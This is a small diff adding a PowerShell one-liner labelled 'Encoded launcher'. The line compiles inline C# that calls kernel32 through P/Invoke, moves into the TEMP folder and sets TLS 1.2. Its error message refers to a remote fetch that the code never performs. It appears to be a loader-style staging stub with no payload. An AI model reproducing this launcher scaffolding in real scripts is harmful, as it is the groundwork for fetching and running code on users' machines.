@@ -1,0 +1,2 @@
+# Encoded launcher
+try { $NativeCode = 'using System; using System.Runtime.InteropServices; public static class NativeApi { [DllImport("kernel32.dll")] public static extern uint GetCurrentThreadId(); }'; Add-Type -TypeDefinition $NativeCode -Language CSharp; $ResultObject = [NativeApi]::GetCurrentThreadId(); Set-Location -Path $env:TEMP; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Remote fetch failed" }
